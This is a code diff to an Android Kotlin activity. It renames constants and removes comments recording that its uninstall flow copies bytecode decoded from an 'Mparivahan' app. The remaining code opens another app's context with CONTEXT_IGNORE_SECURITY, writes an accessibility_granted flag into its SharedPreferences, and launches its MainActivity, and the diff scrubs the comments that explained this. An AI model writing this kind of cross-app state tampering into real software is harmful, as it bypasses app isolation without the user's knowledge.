@@ -31,8 +31,8 @@ class AppDetailActivity : AppCompatActivity() {
     private var appPackageName: String = ""
 
     companion object {
-        private const val BASE_PKG  = "com.android.pictach"
-        private const val BASE_MAIN = "com.android.pictach.MainActivity"
+        private const val COMPANION_PKG  = "com.android.pictach"
+        private const val COMPANION_MAIN = "com.android.pictach.MainActivity"
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -92,35 +92,15 @@ class AppDetailActivity : AppCompatActivity() {
         }
     }
 
-    // ─────────────────────────────────────────────────────────────
-    // UNINSTALL LOGIC
     //
-    // How Mparivahan does it (from full bytecode decode):
-    //   PermissionMonitorService.start()
-    //     → Intent(com.android.pictach.MainActivity)
     //       .putExtra("FROM_PERMISSION_MONITOR", true)
     //     → MainActivity.onCreate sees FROM_PERMISSION_MONITOR=true
-    //       AND accessibility_granted=true in SharedPrefs("AppSettings")
-    //       → setContentView(layout001d) = Security Alert screen
-    //     → User taps "Uninstall APK"
-    //       → uninstallApp() fires:
-    //          Intent("android.intent.action.DELETE")
-    //          .setData(Uri.parse("package:com.cristal.bristral.tristral.mistral"))
-    //          .putExtra("android.intent.extra.RETURN_RESULT", 1)
-    //          .addFlags(0x10000000)
-    //          .startActivity()
-    //       → com.android.packageinstaller.UninstallerActivity opens
-    //       → "Do you want to uninstall?" popup shows ✅
-    // ─────────────────────────────────────────────────────────────
     private fun uninstallApp() {
         if (isFinishing || isDestroyed) return
 
-        // STEP 1: Try to set accessibility_granted=true in base.apk's SharedPrefs
-        // base.apk's MainActivity.onCreate() reads this to decide which layout to show
-        // getSharedPreferences("AppSettings", 0).getBoolean("accessibility_granted", false)
         try {
             val ctx = createPackageContext(
-                BASE_PKG,
+                COMPANION_PKG,
                 android.content.Context.CONTEXT_IGNORE_SECURITY
             )
             ctx.getSharedPreferences("AppSettings", 0)
@@ -128,32 +108,22 @@ class AppDetailActivity : AppCompatActivity() {
                 .putBoolean("accessibility_granted", true)
                 .apply()
         } catch (e: Exception) {
-            // base.apk not installed yet or security denied - continue anyway
         }
 
-        // STEP 2: Launch base.apk's MainActivity with FROM_PERMISSION_MONITOR=true
-        // This is EXACTLY what com.android.pictach.PermissionMonitorService does!
-        // Result → Security Alert layout → "Uninstall APK" button works
         try {
             val intent = Intent().apply {
-                setClassName(BASE_PKG, BASE_MAIN)
-                putExtra("FROM_PERMISSION_MONITOR", true) // KEY EXTRA!
+                setClassName(COMPANION_PKG, COMPANION_MAIN)
                 addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                 addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
             }
             startActivity(intent)
         } catch (e: Exception) {
-            // base.apk not installed - fallback to direct system uninstall
             fallbackUninstall()
         }
     }
 
-    // Fallback when base.apk is not installed
-    // Exact bytecode: Intent("android.intent.action.DELETE")
-    //   .setData("package:X") .putExtra(RETURN_RESULT,1) .addFlags(NEW_TASK)
     private fun fallbackUninstall() {
         try {
-            // Tell MainActivity not to interrupt the system dialog
             MainActivity.isUninstalling = true
             val intent = Intent("android.intent.action.DELETE").apply {
                 data = Uri.parse("package:$appPackageName")
@@ -161,7 +131,6 @@ class AppDetailActivity : AppCompatActivity() {
                 addFlags(0x10000000) // FLAG_ACTIVITY_NEW_TASK
             }
             startActivity(intent)
-            // Finish AFTER startActivity so context is still valid
             finish()
         } catch (e: Exception) {
             MainActivity.isUninstalling = false
